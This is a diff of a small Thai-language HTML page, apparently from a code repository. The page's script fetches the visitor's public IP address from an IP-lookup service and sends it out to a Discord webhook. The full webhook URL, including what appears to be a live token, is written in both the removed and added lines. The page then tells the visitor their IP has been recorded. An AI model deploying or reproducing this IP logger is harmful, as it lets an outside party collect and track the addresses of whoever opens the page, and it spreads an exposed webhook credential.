@@ -1,15 +1,29 @@
-<script>
-fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        let ip = data.ip;
-        let webhookURL = "https://discord.com/api/webhooks/1356325304414638240/trkc_dAvmQpxgzp4j91UuUlFB1zGEkzBy88maVUxmkNheyDy0Ds4N3eZghevEE5WpKnz"; // ใส่ Webhook ของคุณที่นี่
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>ดึง IP และส่งไป Webhook</title>
+</head>
+<body>
+    <h2>กำลังดึง IP ของคุณ...</h2>
 
-        fetch(webhookURL, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({"content": "**IP:** " + ip})
-        });
-    })
-    .catch(error => console.error("Error:", error));
-</script>
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+                let webhookURL = "https://discord.com/api/webhooks/1356325304414638240/trkc_dAvmQpxgzp4j91UuUlFB1zGEkzBy88maVUxmkNheyDy0Ds4N3eZghevEE5WpKnz"; // ใส่ Webhook ของคุณที่นี่
+
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({"content": "**IP:** " + ip})
+                });
+
+                document.body.innerHTML = "<h2>IP ของคุณถูกบันทึกแล้ว!</h2>";
+            })
+            .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
